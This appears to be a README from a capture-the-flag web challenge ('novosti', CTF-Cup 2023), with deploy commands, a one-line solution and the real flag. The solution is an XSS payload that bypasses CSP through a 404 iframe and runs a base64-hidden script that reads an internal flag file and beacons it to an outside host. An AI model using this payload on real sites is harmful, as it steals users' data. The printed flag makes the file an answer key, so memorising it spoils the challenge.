# web | novosti

![novosti share page](./screenshots/novosti.png)

## Information

Мы думаем над тем, чтобы запустить свою собственную газету и новостной сайт, но не хотим связываться с новостными агенствами,
поэтому мы решили получать новости из первоисточника - очевидцей самих новостей!

[https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru](https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru)

## Deploy

```sh
cd deploy
export NOVOSTI_FLAG="ctfcup{flag}"
export NOVOSTI_ADMIN_TOKEN="$(python3 -c 'print(__import__("os").urandom(32).hex())')"
echo $NOVOSTI_ADMIN_TOKEN > .novosti-admin-token # backup for restart
docker compose -p web-novosti up --build -d
```

## Public

Provide zip file: [public/novosti.zip](public/novosti.zip).

## TLDR

XSS, use iframe leading to 404 in order to bypass CSP

```html
<script>
  const iframe = document.createElement("iframe");
  iframe.src = "/404";
  document.body.appendChild(iframe);
  setTimeout(() => {
    iframe.contentWindow.document.body.innerHTML = `<img src=x onerror="eval(atob('ZmV0Y2goImh0dHA6Ly9maWxlczo4MDgwL2ZsYWciKS50aGVuKHI9PnIudGV4dCgpKS50aGVuKHQ9Pm5hdmlnYXRvci5zZW5kQmVhY29uKCJodHRwOi8vcmVuYm91LnJ1Iix0KSk7'))" />`;
  }, 1000);
</script>
```

## Writeup (ru)

TODO

## Writeup (en)

TODO

## Domain

https://novosti-3d5d54b8c9f9f81aabcf60563021845f.ctfcup-2023.ru

## Cloudflare

Yes

## Flag

ctfcup{b4by-1fr4m3-x55-a4371ea843fc145f}
